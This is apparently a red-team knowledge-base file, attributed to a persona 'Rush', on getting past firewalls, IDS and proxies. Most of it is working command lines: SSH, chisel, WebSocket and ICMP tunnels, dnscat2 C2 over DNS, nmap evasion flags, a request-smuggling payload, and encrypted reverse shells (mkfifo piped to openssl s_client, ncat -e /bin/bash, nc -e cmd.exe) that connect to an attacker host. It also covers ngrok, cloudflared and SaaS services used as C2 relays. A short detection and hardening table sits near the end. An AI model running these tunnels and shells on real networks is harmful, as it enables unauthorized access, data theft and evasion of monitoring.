# GS-21: Firewall & Network Evasion — Rush (Royal Guard)

> **Classification**: Palace Security Knowledge Seed
> **Author**: Rush — The Breacher (Network Penetration)
> **Source**: SANS SEC560 (Network Penetration Testing), MITRE ATT&CK T1572, T1090, T1573
> **Last Updated**: 2026-03-09

---

## 1. Evasion Philosophy

Firewalls block ports. IDS inspects packets. Proxies filter URLs. Every network has controls.
But every network also has at least ONE path outbound that's allowed — HTTP, HTTPS, DNS, or
something else. Your job is to find that path and tunnel through it.

**GS-27 Mindset**: Think every route. WiFi, cellular, satellite, tunnel, mesh, Bluetooth,
physical, cloud relay. The Palace must be reachable from ANYWHERE on ANY network at ANY time.
That means we must understand every evasion technique — both to use them and to defend against them.

**Techniques covered:**
1. SSH Tunneling (Local, Remote, Dynamic)
2. Chisel (TCP over HTTP)
3. dnscat2 (C2 over DNS)
4. ICMP Tunneling
5. HTTP CONNECT Proxy Abuse
6. WebSocket Tunneling
7. IP Fragmentation & Protocol Manipulation
8. Application Layer Smuggling
9. Encrypted Channel Techniques
10. Cloud Service Relay

---

## 2. SSH Tunneling

### 2.1 Local Port Forward

Forward a port from your machine through the SSH server to a target behind the firewall.

```bash
# Syntax: ssh -L [local_port]:[target_host]:[target_port] user@ssh_server

# Forward local port 8080 to internal web server (10.10.10.100:80) through jump box
ssh -L 8080:10.10.10.100:80 user@jumpbox.palace.local

# Now access http://localhost:8080 to reach the internal web server

# Forward local port 1433 to internal MSSQL
ssh -L 1433:10.10.10.200:1433 user@jumpbox.palace.local

# Multiple forwards in one connection
ssh -L 8080:10.10.10.100:80 -L 3389:10.10.10.100:3389 -L 445:10.10.10.100:445 user@jumpbox

# Bind to all interfaces (not just localhost) — useful for team pivoting
ssh -L 0.0.0.0:8080:10.10.10.100:80 user@jumpbox

# With key-based auth and no shell (just the tunnel)
ssh -i id_rsa -L 8080:10.10.10.100:80 user@jumpbox -N -f
# -N = no command execution, -f = background
```

### 2.2 Remote Port Forward (Reverse Tunnel)

Make a port on the SSH server forward back to your machine. Bypasses inbound firewall rules
because the connection is initiated OUTBOUND from behind the firewall.

```bash
# Syntax: ssh -R [remote_port]:[local_host]:[local_port] user@ssh_server

# From compromised host behind firewall, open port 9999 on your attack server
# that forwards to the compromised host's port 3389
ssh -R 9999:127.0.0.1:3389 attacker@10.10.14.5

# Now on your attack server: rdesktop localhost:9999

# Reverse tunnel for SOCKS proxy (pivot through compromised host)
ssh -R 1080 attacker@10.10.14.5 -N
# On attack server: proxychains nmap -sT -p 80,443,445 10.10.10.0/24

# GatewayPorts must be enabled on the SSH server for binding to 0.0.0.0
# /etc/ssh/sshd_config: GatewayPorts yes
```

### 2.3 Dynamic Port Forward (SOCKS Proxy)

Create a SOCKS4/5 proxy through the SSH connection. Routes ANY traffic through the tunnel.

```bash
# Syntax: ssh -D [local_port] user@ssh_server

# Create SOCKS proxy on port 1080
ssh -D 1080 user@jumpbox.palace.local -N -f

# Use with proxychains (configure /etc/proxychains4.conf)
# socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 80,443,445,3389 10.10.10.0/24
proxychains curl http://10.10.10.100/
proxychains xfreerdp /v:10.10.10.100 /u:admin /p:password

# Firefox: Settings > Network > Manual Proxy > SOCKS Host: 127.0.0.1, Port: 1080
# Burp Suite: Project Options > SOCKS Proxy > 127.0.0.1:1080
```

### 2.4 SSH Over Non-Standard Ports

```bash
# If port 22 is blocked, SSH through port 443 (HTTPS port almost always allowed)
# On server: configure sshd to listen on 443
# /etc/ssh/sshd_config: Port 443

ssh -p 443 user@server.palace.local

# Multiplex SSH over HTTP with apache/nginx reverse proxy
# Use sslh to share port 443 between HTTPS and SSH
# sslh listens on 443, detects protocol, forwards SSH to 22 and HTTPS to 8443
```

---

## 3. Chisel — TCP Tunneling over HTTP

### 3.1 Overview

Chisel is a fast TCP/UDP tunnel over HTTP, secured via SSH. It works through HTTP proxies,
firewalls, and WAFs because the traffic looks like normal HTTP/WebSocket traffic.

### 3.2 Setup — Server (Attacker)

```bash
# Start chisel server on attacker machine
chisel server --port 8080 --reverse

# With authentication
chisel server --port 8080 --reverse --auth user:password

# Listen on HTTPS (blend with legitimate traffic)
chisel server --port 443 --reverse --key /path/to/key.pem --cert /path/to/cert.pem
```

### 3.3 Setup — Client (Target / Compromised Host)

```bash
# Reverse port forward: target's port 3389 becomes accessible on attacker's port 9999
chisel client 10.10.14.5:8080 R:9999:127.0.0.1:3389

# Reverse SOCKS proxy (pivot through target's network)
chisel client 10.10.14.5:8080 R:1080:socks

# Forward local port through target
chisel client 10.10.14.5:8080 1433:10.10.10.200:1433

# Multiple tunnels in one connection
chisel client 10.10.14.5:8080 R:9999:127.0.0.1:3389 R:9998:10.10.10.200:445 R:1080:socks

# Through an HTTP proxy (corporate proxy evasion)
chisel client --proxy http://proxy.corp.local:8080 10.10.14.5:443 R:1080:socks

# Windows executable (drop and run)
.\chisel.exe client 10.10.14.5:8080 R:1080:socks
```

### 3.4 Advanced Chisel Patterns

```bash
# Double pivot: Attacker -> Host A -> Host B -> Internal Network
# On attacker: chisel server --port 8080 --reverse
# On Host A: chisel client 10.10.14.5:8080 R:1080:socks
#            chisel server --port 9090 --reverse (start second server)
# On Host B: chisel client HostA:9090 R:2080:socks

# Then chain proxies in proxychains.conf:
# socks5 127.0.0.1 1080   (through Host A)
# socks5 127.0.0.1 2080   (through Host B)

# Chisel with domain fronting (advanced evasion)
chisel client --header "Host: legitimate.azureedge.net" https://cdn-endpoint.azureedge.net R:1080:socks
```

---

## 4. dnscat2 — C2 over DNS

### 4.1 Overview

dnscat2 creates a command-and-control channel over DNS queries and responses. Since DNS is
almost never blocked (even the most restrictive firewalls allow DNS to resolve), this is one
of the most reliable covert channels.

### 4.2 Server Setup (Attacker)

```bash
# Install dnscat2 server
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# Start server — direct mode (client connects directly to your DNS server)
ruby dnscat2.rb

# Start server — domain mode (requires you to own a domain with NS records pointing to your server)
ruby dnscat2.rb tunnel.palace-c2.com
# DNS setup required:
#   NS record: tunnel.palace-c2.com -> ns1.palace-c2.com
#   A record:  ns1.palace-c2.com -> [your_server_ip]

# With encryption
ruby dnscat2.rb --secret=PalaceSecret123 tunnel.palace-c2.com

# Server commands once a session is established:
# sessions          — list active sessions
# session -i 1      — interact with session 1
# shell             — open a command shell
# download file.txt — download a file
# upload local.exe  — upload a file
# listen 127.0.0.1:9999 10.10.10.100:3389  — port forward through DNS tunnel
```

### 4.3 Client Setup (Target)

```bash
# Linux client
cd dnscat2/client
make
./dnscat --secret=PalaceSecret123 tunnel.palace-c2.com

# Direct mode (no domain needed, but more detectable)
./dnscat --dns server=10.10.14.5,port=53

# Windows client (compiled binary or PowerShell)
.\dnscat2.exe --secret=PalaceSecret123 tunnel.palace-c2.com

# PowerShell dnscat2 client (no binary needed)
Import-Module .\dnscat2.ps1
Start-Dnscat2 -Domain tunnel.palace-c2.com -PreSharedSecret PalaceSecret123
```

### 4.4 dnscat2 Port Forwarding

```bash
# Inside a dnscat2 session, create port forwards
# Forward local port 3389 on the target through DNS to attacker
dnscat2> listen 127.0.0.1:8888 10.10.10.100:3389
# Now connect to localhost:8888 on the attacker to reach target's RDP

# Tunnel through DNS is SLOW (max ~50 KB/s) but extremely stealthy
# Best for: command execution, small file transfers, maintaining access
# Not suitable for: large file transfers, real-time interaction, RDP sessions
```

---

## 5. ICMP Tunneling

### 5.1 Overview

ICMP (ping) traffic is often allowed through firewalls. ICMP tunneling encodes data in the
payload of ICMP echo request/reply packets. This is extremely stealthy but very slow.

### 5.2 icmpsh — Simple ICMP Shell

```bash
# Attacker (Linux) — disable kernel ICMP replies first
sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Start icmpsh listener
python3 icmpsh_m.py 10.10.14.5 10.10.10.50
# Args: [attacker_ip] [target_ip]

# Target (Windows) — run the slave
.\icmpsh.exe -t 10.10.14.5
# No admin required. No port opens. No TCP/UDP connection.
```

### 5.3 ptunnel-ng — TCP over ICMP

```bash
# Server (attacker or relay point)
ptunnel-ng -r10.10.14.5 -R22
# -r = address to forward to, -R = port to forward to

# Client (compromised host)
ptunnel-ng -p10.10.14.5 -l2222 -r10.10.14.5 -R22
# -p = proxy (server), -l = local listen port

# Now: ssh -p 2222 user@localhost
# Traffic flows: client -> ICMP -> server -> SSH

# With password protection
ptunnel-ng -r10.10.14.5 -R22 -x PalaceSecret
ptunnel-ng -p10.10.14.5 -l2222 -r10.10.14.5 -R22 -x PalaceSecret
```

### 5.4 hans — IP over ICMP (Full Tunnel)

```bash
# Server (attacker)
hans -s 10.0.0.1 -p PalaceSecret
# Creates a tun0 interface with IP 10.0.0.1

# Client (target)
hans -c 10.10.14.5 -p PalaceSecret
# Creates a tun0 interface with IP 10.0.0.100

# Now you have full IP connectivity through ICMP
# Route traffic through the tunnel:
ip route add 10.10.10.0/24 via 10.0.0.1 dev tun0
```

---

## 6. HTTP CONNECT Proxy Abuse

### 6.1 Theory

Many corporate networks route all HTTP/HTTPS through a proxy server. The HTTP CONNECT method
is used for HTTPS — it tells the proxy to create a raw TCP tunnel to the destination. If the
proxy doesn't restrict CONNECT to port 443, you can tunnel ANY protocol through it.

### 6.2 Proxytunnel

```bash
# Tunnel SSH through an HTTP proxy
proxytunnel -p proxy.corp.local:8080 -d attacker.palace.net:443 -a 2222

# Now connect through the tunnel
ssh -p 2222 user@localhost

# With proxy authentication (NTLM)
proxytunnel -p proxy.corp.local:8080 -d attacker.palace.net:443 -a 2222 \
  -P "CORP\user" -W "password"

# In SSH config (~/.ssh/config) for persistent proxy tunneling
# Host attacker
#   HostName attacker.palace.net
#   Port 443
#   ProxyCommand proxytunnel -p proxy.corp.local:8080 -d %h:%p -H "User-Agent: Mozilla/5.0"
```

### 6.3 corkscrew

```bash
# Lightweight SSH-through-proxy tool
# SSH config:
# Host attacker
#   HostName attacker.palace.net
#   Port 443
#   ProxyCommand corkscrew proxy.corp.local 8080 %h %p ~/.ssh/proxy_auth
# proxy_auth file: username:password

ssh attacker
```

### 6.4 Nmap Through Proxies

```bash
# Scan through an HTTP proxy (only TCP connect scans work through proxies)
proxychains nmap -sT -Pn -p 80,443,445,3389 10.10.10.0/24

# Proxychains configuration (/etc/proxychains4.conf)
# strict_chain
# proxy_dns
# [ProxyList]
# http 10.10.10.1 8080 username password
# socks5 127.0.0.1 1080
```

---

## 7. WebSocket Tunneling

### 7.1 Overview

WebSockets upgrade an HTTP connection to a full-duplex TCP channel. Most firewalls, proxies,
and WAFs allow WebSocket upgrades because they're used by legitimate applications (chat, real-time
feeds, etc.). This makes WebSockets an excellent covert channel.

### 7.2 wstunnel

```bash
# Server (attacker) — listen for WebSocket connections and forward
wstunnel server ws://0.0.0.0:8080

# Client (target) — tunnel local port through WebSocket to remote destination
wstunnel client -L 127.0.0.1:9999:10.10.10.100:3389 ws://attacker.palace.net:8080

# HTTPS WebSocket (blends with HTTPS traffic)
wstunnel server wss://0.0.0.0:443 --tls-certificate cert.pem --tls-private-key key.pem
wstunnel client -L 127.0.0.1:9999:10.10.10.100:3389 wss://attacker.palace.net:443

# SOCKS proxy through WebSocket
wstunnel client -L socks5://127.0.0.1:1080 wss://attacker.palace.net:443

# Through corporate HTTP proxy
wstunnel client -L 127.0.0.1:9999:10.10.10.100:3389 \
  --http-proxy proxy.corp.local:8080 \
  wss://attacker.palace.net:443

# With custom HTTP headers to mimic legitimate traffic
wstunnel client -L 127.0.0.1:9999:10.10.10.100:3389 \
  --http-headers "Host: legitimate-app.azurewebsites.net" \
  wss://attacker.palace.net:443
```

### 7.3 websocat

```bash
# Simple WebSocket to TCP bridge
# Server side: pipe WebSocket to a local TCP service
websocat --binary ws-l:0.0.0.0:8080 tcp:127.0.0.1:22

# Client side: connect to WebSocket and pipe to local port
websocat --binary tcp-l:127.0.0.1:2222 ws://attacker.palace.net:8080

# Now: ssh -p 2222 localhost (SSH through WebSocket)
```

---

## 8. IP Fragmentation & Protocol Manipulation

### 8.1 Nmap Fragmentation Evasion

```bash
# Fragment packets to evade IDS/IPS
nmap -f 10.10.10.50                    # Fragment into 8-byte chunks
nmap -f -f 10.10.10.50                 # Fragment into 16-byte chunks
nmap --mtu 24 10.10.10.50              # Custom MTU (must be multiple of 8)

# Decoy scanning (hide your IP among decoys)
nmap -D 10.10.10.1,10.10.10.2,ME,10.10.10.3 10.10.10.50
nmap -D RND:10 10.10.10.50             # 10 random decoy IPs

# Idle/zombie scan (completely blind — your IP never touches the target)
nmap -sI zombie.host.com 10.10.10.50

# Source port manipulation (some firewalls allow traffic from port 53 or 80)
nmap --source-port 53 10.10.10.50
nmap -g 53 10.10.10.50                 # Same thing, short form

# Append random data to packets (change packet signatures)
nmap --data-length 50 10.10.10.50

# MAC spoofing (local network only)
nmap --spoof-mac Dell 10.10.10.50      # Spoof as Dell vendor
nmap --spoof-mac 00:11:22:33:44:55 10.10.10.50

# Timing evasion
nmap -T0 10.10.10.50                   # Paranoid: 5-minute intervals
nmap -T1 10.10.10.50                   # Sneaky: 15-second intervals

# Combined evasion scan
nmap -f --mtu 24 -D RND:5 --source-port 53 --data-length 40 -T2 \
  -sS -Pn -p 80,443,445,3389 10.10.10.50
```

### 8.2 fragroute / fragrouter

```bash
# fragroute — intercepts and fragments outbound traffic
# Configuration file (fragroute.conf):
#   ip_frag 8          # Fragment at 8-byte boundaries
#   ip_chaff dup        # Insert duplicate fragments
#   order random        # Randomize fragment order
#   delay random 0.1    # Random delays between fragments

fragroute -f fragroute.conf 10.10.10.50
```

### 8.3 TTL Manipulation

```bash
# Send packets with short TTL that reach the target but expire before the IDS
# (IDS is often positioned differently in the network path)
nmap --ttl 64 10.10.10.50

# Scapy for precise TTL manipulation
python3 -c "
from scapy.all import *
# Send SYN with TTL that reaches target but not IDS
pkt = IP(dst='10.10.10.50', ttl=10)/TCP(dport=445, flags='S')
send(pkt)
"
```

---

## 9. Application Layer Smuggling

### 9.1 HTTP Request Smuggling

```bash
# Exploit discrepancies between frontend (CDN/WAF) and backend (web server)
# in how they parse HTTP requests

# CL.TE smuggling (frontend uses Content-Length, backend uses Transfer-Encoding)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | ncat target.com 80

# TE.CL smuggling (frontend uses Transfer-Encoding, backend uses Content-Length)
# Use Burp Suite's HTTP Request Smuggler extension for automated detection
```

### 9.2 DNS Rebinding

```bash
# Trick a server into connecting to internal resources via DNS rebinding
# 1. Attacker controls a domain with short TTL
# 2. First DNS query resolves to attacker's IP
# 3. Second query (after TTL expires) resolves to internal IP (127.0.0.1, 10.x.x.x)
# 4. Browser/application connects to internal resource thinking it's the attacker's domain

# Tools: singularity, rbndr, whonow
# singularity setup:
git clone https://github.com/nccgroup/singularity.git
cd singularity
go build -o singularity cmd/singularity-server/main.go
./singularity -ResponseIPAddr 10.10.10.100 -ResponseReboundIPAddr 127.0.0.1
```

### 9.3 Encapsulation in Allowed Protocols

```bash
# Tunnel arbitrary data inside legitimate-looking HTTP requests
# Use custom HTTP headers, cookies, or POST bodies to carry C2 data

# Example: Data in HTTP cookies (Cobalt Strike malleable C2 approach)
# Beacon sends data as: GET / HTTP/1.1\r\nCookie: session=<base64_encoded_data>
# Server responds with data in: Set-Cookie or response body

# Example: Data in HTTP chunked encoding
# Each chunk can carry a small payload while looking like normal HTTP streaming

# socat for protocol encapsulation
# Wrap TCP in HTTP-like headers
socat TCP-LISTEN:4444 EXEC:"curl -s http://attacker.palace.net/c2endpoint"
```

---

## 10. Encrypted Channel Techniques (T1573)

### 10.1 Stunnel — SSL Wrapper

```bash
# Wrap ANY TCP connection in SSL/TLS

# Server config (stunnel.conf on attacker):
# [reverse-shell]
# accept = 443
# connect = 127.0.0.1:4444
# cert = /etc/stunnel/stunnel.pem

stunnel /etc/stunnel/stunnel.conf

# Client config (on target):
# [reverse-shell]
# client = yes
# accept = 127.0.0.1:5555
# connect = attacker.palace.net:443
# verify = 0

stunnel stunnel-client.conf

# Now: nc -e cmd.exe 127.0.0.1 5555 (on target)
# The reverse shell traffic is wrapped in TLS on port 443 — looks like HTTPS
```

### 10.2 OpenSSL Encrypted Reverse Shell

```bash
# Generate certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=palace'

# Listener (attacker)
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

# Reverse shell (target — Linux)
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:443 > /tmp/s; rm /tmp/s

# Reverse shell (target — Windows PowerShell)
$client = New-Object System.Net.Sockets.TcpClient("10.10.14.5", 443)
$stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, {$true})
$stream.AuthenticateAsClient("palace")
# ... (full encrypted shell setup)
```

### 10.3 Ncat Encrypted Channels

```bash
# ncat (nmap's netcat) has built-in SSL support

# Listener with SSL
ncat --ssl -lvp 443

# Reverse shell with SSL (Linux)
ncat --ssl -e /bin/bash 10.10.14.5 443

# Reverse shell with SSL (Windows)
ncat.exe --ssl -e cmd.exe 10.10.14.5 443

# With client certificate authentication (two-way SSL)
ncat --ssl --ssl-cert server-cert.pem --ssl-key server-key.pem --ssl-verify -lvp 443
ncat --ssl --ssl-cert client-cert.pem --ssl-key client-key.pem 10.10.14.5 443 -e /bin/bash
```

### 10.4 WireGuard VPN Tunnel

```bash
# WireGuard creates a full VPN tunnel that looks like UDP noise
# Excellent for persistent covert access

# Server setup (attacker)
wg genkey | tee server-private.key | wg pubkey > server-public.key
wg genkey | tee client-private.key | wg pubkey > client-public.key

cat > /etc/wireguard/wg0.conf << 'WGEOF'
[Interface]
Address = 10.200.200.1/24
ListenPort = 51820
PrivateKey = <server-private-key>

[Peer]
PublicKey = <client-public-key>
AllowedIPs = 10.200.200.2/32
WGEOF

wg-quick up wg0

# Client setup (target)
cat > /etc/wireguard/wg0.conf << 'WGEOF'
[Interface]
Address = 10.200.200.2/24
PrivateKey = <client-private-key>

[Peer]
PublicKey = <server-public-key>
Endpoint = attacker.palace.net:51820
AllowedIPs = 10.200.200.0/24
PersistentKeepalive = 25
WGEOF

wg-quick up wg0

# Full network access through encrypted tunnel
# All traffic on 10.200.200.0/24 is encrypted and looks like random UDP
```

---

## 11. Cloud Service Relay

### 11.1 Theory

Modern networks allow traffic to cloud services (AWS, Azure, GCP, Slack, Teams, etc.).
Using these services as relay points makes C2 traffic indistinguishable from legitimate usage.

### 11.2 Cloud-Based Tunneling

```bash
# ngrok — instant tunnel to the internet (from behind any firewall)
ngrok tcp 4444
# Creates a public TCP endpoint that forwards to your local port 4444
# Target connects to: 0.tcp.ngrok.io:12345 -> your listener on 4444

# Cloudflare Tunnel (formerly Argo Tunnel)
cloudflared tunnel --url tcp://localhost:4444
# Creates a tunnel through Cloudflare's network — extremely hard to block

# Azure Relay — Hybrid Connections
# Leverages Azure's infrastructure for bidirectional communication
# Traffic goes through *.servicebus.windows.net — blocked by almost nobody

# AWS Systems Manager Session Manager
# If target has SSM agent, you get a shell through AWS infrastructure
aws ssm start-session --target i-0123456789abcdef0
```

### 11.3 Legitimate Service Abuse

```bash
# Slack/Discord/Teams as C2 channels
# Multiple C2 frameworks support these (Mythic, Sliver, custom)
# Traffic goes to slack.com / discord.com / teams.microsoft.com
# Virtually impossible to block without breaking business operations

# Google Sheets as C2 dead drop
# Agent writes output to Google Sheet, operator reads it
# Agent reads commands from Google Sheet, executes them
# All traffic goes to docs.google.com over HTTPS

# Notion/Trello/Airtable as C2
# Same dead-drop principle — legitimate SaaS traffic
```

---

## 12. Comprehensive Evasion Methodology

### Step-by-step when you're behind a restrictive firewall:

```
STEP 1: Identify what's ALLOWED outbound
   - Test common ports: 80, 443, 53, 8080, 8443
   - Test protocols: HTTP, HTTPS, DNS, ICMP
   - Check if there's a proxy (check env vars, browser settings, WPAD)

STEP 2: Pick your channel based on what's allowed
   ┌─────────────────────────────────────────────────────┐
   │ Allowed?     │ Best Tool              │ Speed       │
   ├──────────────┼────────────────────────┼─────────────┤
   │ HTTPS (443)  │ Chisel / wstunnel      │ Fast        │
   │ HTTP (80)    │ Chisel / HTTP tunnel   │ Fast        │
   │ DNS (53)     │ dnscat2 / iodine       │ Slow        │
   │ ICMP         │ ptunnel-ng / hans      │ Very slow   │
   │ HTTP proxy   │ proxytunnel + SSH      │ Medium      │
   │ Cloud SaaS   │ ngrok / cloudflared    │ Fast        │
   │ Nothing      │ Physical / USB drop    │ N/A         │
   └─────────────────────────────────────────────────────┘

STEP 3: Establish the tunnel

STEP 4: Layer encryption (stunnel, ncat --ssl, or built-in tool encryption)

STEP 5: Route operational traffic through the tunnel
   - SOCKS proxy for broad access
   - Specific port forwards for targeted services

STEP 6: Monitor your tunnel for stability
   - Keepalives, auto-reconnect, fallback channels
```

---

## 13. Detection & Defense (Palace Blue Team)

### What to Monitor

| Technique | Detection Method |
|-----------|-----------------|
| SSH tunneling | Unusual SSH traffic patterns, SSH on port 443 |
| Chisel | HTTP Upgrade headers to non-standard endpoints, long-lived WebSocket connections |
| dnscat2 | High-entropy DNS queries, unusual TXT record volume, long subdomain labels |
| ICMP tunneling | ICMP packets with payloads > 64 bytes, high ICMP volume |
| HTTP CONNECT | CONNECT method to non-443 ports, CONNECT to unusual destinations |
| WebSocket | Long-lived WebSocket connections with regular small payloads (beaconing) |
| Fragmentation | Abnormal fragment sizes, overlapping fragments |
| Cloud relay | Unusual volume of traffic to cloud services, cloud service API calls from servers |

### Hardening

1. **Egress filtering**: Only allow necessary outbound ports. HTTPS should go through an inspecting proxy.
2. **DNS inspection**: Use internal DNS resolvers. Block direct DNS to external servers. Monitor for tunneling indicators.
3. **TLS inspection**: Deploy a corporate CA and inspect TLS traffic (with appropriate legal/privacy controls).
4. **ICMP restrictions**: Rate-limit ICMP. Block ICMP payloads > 64 bytes.
5. **Proxy enforcement**: Force all HTTP/HTTPS through authenticated proxy. Block direct connections.
6. **Network segmentation**: Internal servers should NOT have outbound internet access.
7. **Cloud access broker (CASB)**: Monitor and control access to cloud services.
8. **JA3/JA4 monitoring**: Flag known tunneling tool fingerprints (see GS-19).

---

## 14. Rush's Operational Notes

**Palace rules for tunnel operations:**
- Always have a backup channel. If your primary tunnel drops, you need a fallback ready within 60 seconds.
- Layer your encryption. Chisel through an SSH tunnel through a SOCKS proxy = three layers of obfuscation.
- DNS tunneling is the last resort but the most reliable. It's slow but it ALWAYS works unless they're doing full DNS inspection with a resolver whitelist.
- Never use the same tunnel technique twice on the same engagement. Rotate methods.
- Cloud relays (ngrok, cloudflared) are the fastest to deploy but leave traces with the cloud provider. Use for short operations only.
- WireGuard is the best long-term persistent tunnel. It's fast, encrypted, and looks like random UDP noise.
- Test your tunnel BEFORE the operation. Nothing worse than debugging chisel flags while under time pressure.
- For Palace defense: egress filtering is the single most impactful control. If you block all unnecessary outbound traffic, you stop 90% of these techniques.

**GS-27 applied**: The Palace must be reachable through ANY firewall, from ANY network. That means
we maintain at least three independent access methods at all times: VPN, cloud relay, and DNS tunnel.
If one goes down, we failover. If two go down, we still have access. Redundancy is not optional.

---

*"There's no such thing as a blocked port. There's only a port you haven't figured out how to use yet." — Rush*
